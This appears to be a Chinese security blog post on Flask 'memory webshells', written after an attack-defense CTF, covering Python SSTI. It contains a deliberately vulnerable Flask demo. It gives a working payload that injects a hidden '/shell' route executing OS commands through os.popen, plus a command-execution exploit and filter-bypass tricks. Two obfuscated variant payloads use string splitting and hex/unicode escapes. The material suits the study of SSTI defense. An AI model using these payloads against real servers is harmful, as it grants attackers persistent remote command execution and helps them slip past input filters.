# Python安全学习—Flask内存马

Author: H3rmesk1t

本文首发于[先知社区](https://xz.aliyun.com/t/10933)

## 前言
打安洵杯线下的时候有一道`Python`的`SSTI`模板注入的`AWD`题目, 由于之前没有怎么接触过关于`Python`的攻防点, 一度被别人种了`Python 内存马`都还没发现, 等比赛中断发现修补后的题目被打进来后, 查看流量记录才意识到攻击者前面是用的`Flask`内存马打的, 之前看过大概的思路却鸽了一直没学, 这里暂且记录一下相关知识点.

## 概念
常用的`Python`框架有`Django`、`Flask`, 这两者都可能存在`SSTI`漏洞. `Python 内存马`利用`Flask`框架中`SSTI`注入来实现, `Flask`框架中在`web`应用模板渲染的过程中用到`render_template_string`进行渲染, 但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现`Python`内存马的注入.

## Flask 请求上下文管理机制
当网页请求进入`Flask`时, 会实例化一个`Request Context`. 在`Python`中分出了两种上下文: 请求上下文(request context)、应用上下文(session context). 一个请求上下文中封装了请求的信息, 而上下文的结构是运用了一个`Stack`的栈结构, 也就是说它拥有一个栈所拥有的全部特性. `request context`实例化后会被`push`到栈`_request_ctx_stack`中, 基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.

## 漏洞环境
先用`Flask`编写一个`SSTI-Demo`:

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)


@app.route('/')
def hello_world():  # put application's code here
    person = 'knave'
    if request.args.get('name'):
        person = request.args.get('name')
    template = '<h1>Hi, %s.</h1>' % person
    return render_template_string(template)


if __name__ == '__main__':
    app.run()
```

原始`Flask`内存马`Payload`:

```python
url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})
```

命令执行结果:

![](./images/1.png)

![](./images/1.png)

## Payload 分析
将前面的`Payload`拆开来, 逐层分析.

```python
url_for.__globals__['__builtins__']['eval'](
    "app.add_url_rule(
        '/shell', 
        'shell', 
        lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read()
    )",
    {
        '_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],
        'app':url_for.__globals__['current_app']
    }
)
```

对于`url_for.__globals__['__builtins__']['eval']`这一截`Payload`, `url_for`是`Flask`的一个内置函数, 通过`Flask`内置函数可以调用其`__globals__`属性, 该特殊属性能够返回函数所在模块命名空间的所有变量, 其中包含了很多已经引入的`modules`, 可以看到这里是支持`__builtins__`的.

![](./images/3.png)

![](./images/4.png)

在`__builtins__`模块中, `Python`在启动时就直接为我们导入了很多内建函数. 准确的说, `Python`在启动时会首先加载内建名称空间, 内建名称空间中有许多名字到对象之间的映射, 这些名字就是内建函数的名称, 对象就是这些内建函数对象. 可以看到, 在`__builtins__`模块的内建函数中是存在`eval`、`exec`等命令执行函数的.

![](./images/5.png)

```python
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'all', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
```

由于存在命令执行函数, 因此我们就可以直接调用命令执行函数来执行危险操作, `Exploit`如下:

```python
{{url_for.__globals__['__builtins__']['eval']("__import__('os').system('open -a Calculator')")}}
```

![](./images/6.png)

接着再来看看`app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())`这一截`Payload`. 这部分是动态添加了一条路由, 而处理该路由的函数是个由`lambda`关键字定义的匿名函数.

在`Flask`中注册路由的时候是添加的`@app.route()`装饰器来实现的, 跟进查看其源码实现, 发现其调用了`add_url_rule`函数来添加路由.

![](./images/7.png)

跟进`add_url_rule`函数, 其参数说明如下:
 - rule: 函数对应的`URL`规则, 满足条件和`app.route`的第一个参数一样, 必须以`/`开头.
 - endpoint: 端点, 即在使用`url_for`进行反转的时候, 这里传入的第一个参数就是`endpoint`对应的值, 这个值也可以不指定, 默认就会使用函数的名字作为`endpoint`的值.
 - view_func: `URL`对应的函数, 这里只需写函数名字而不用加括号.
 - provide_automatic_options: 控制是否应自动添加选项方法.
 - options: 要转发到基础规则对象的选项.

![](./images/8.png)

`lambda`即匿名函数, `Payload`中`add_url_rule`函数的第三个参数定义了一个`lambda`匿名函数, 其中通过`os`库的`popen`函数执行从`Web`请求中获取的`cmd`参数值并返回结果, 其中该参数值默认为`whoami`.

再来看看`'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']}`这一截`Payload`. `_request_ctx_stack`是`Flask`的一个全局变量, 是一个`LocalStack`实例, 这里的`_request_ctx_stack`即上文中提到的`Flask 请求上下文管理机制`中的`_request_ctx_stack`. `app`也是`Flask`的一个全局变量, 这里即获取当前的`app`.

到此, 大致逻辑基本就梳理清晰了, `eval`函数的功能即动态创建一条路由, 并在后面指明了所需变量的全局命名空间, 保证`app`和`_request_ctx_stack`都可以被找到.

## ByPass
在实际应用中往往都存在过滤, 因此了解如何绕过还是必要的.
 - `url_for`可替换为`get_flashed_messages`或者`request.__init__`或者`request.application`.
 - 代码执行函数替换, 如`exec`等替换`eval`.
 - 字符串可采用拼接方式, 如`['__builtins__']['eval']`变为`['__bui'+'ltins__']['ev'+'al']`.
 - `__globals__`可用`__getattribute__('__globa'+'ls__')`替换.
 - `[]`可用`.__getitem__()`或`.pop()`替换.
 - 过滤`{{`或者`}}`, 可以使用`{%`或者`%}`绕过, `{%%}`中间可以执行`if`语句, 利用这一点可以进行类似盲注的操作或者外带代码执行结果.
 - 过滤`_`可以用编码绕过, 如`__class__`替换成`\x5f\x5fclass\x5f\x5f`, 还可以用`dir(0)[0][0]`或者`request['args']`或者`request['values']`绕过.
 - 过滤了`.`可以采用`attr()`或`[]`绕过.
 - 其它的手法参考`SSTI`绕过过滤的方法即可...

这里给出两个变形`Payload`:
 - 原`Payload`

```python
url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/h3rmesk1t', 'h3rmesk1t', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('shell')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})
```

 - 变形`Payload-1`

```python
request.application.__self__._get_data_for_json.__getattribute__('__globa'+'ls__').__getitem__('__bui'+'ltins__').__getitem__('ex'+'ec')("app.add_url_rule('/h3rmesk1t', 'h3rmesk1t', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('shell', 'calc')).read())",{'_request_ct'+'x_stack':get_flashed_messages.__getattribute__('__globa'+'ls__').pop('_request_'+'ctx_stack'),'app':get_flashed_messages.__getattribute__('__globa'+'ls__').pop('curre'+'nt_app')})
```

 - 变形`Payload-2`

```python
get_flashed_messages|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fgetitem\x5f\x5f")("__builtins__")|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fgetitem\x5f\x5f")("\u0065\u0076\u0061\u006c")("app.add_ur"+"l_rule('/h3rmesk1t', 'h3rmesk1t', la"+"mbda :__imp"+"ort__('o"+"s').po"+"pen(_request_c"+"tx_stack.to"+"p.re"+"quest.args.get('shell')).re"+"ad())",{'\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b':get_flashed_messages|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fgetitem\x5f\x5f")("\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b"),'app':get_flashed_messages|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetattribute\x5f\x5f")("\x5f\x5fgetitem\x5f\x5f")("\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070")})
```

![](./images/10.png)

## 参考
 - [浅析Python Flask内存马](https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/)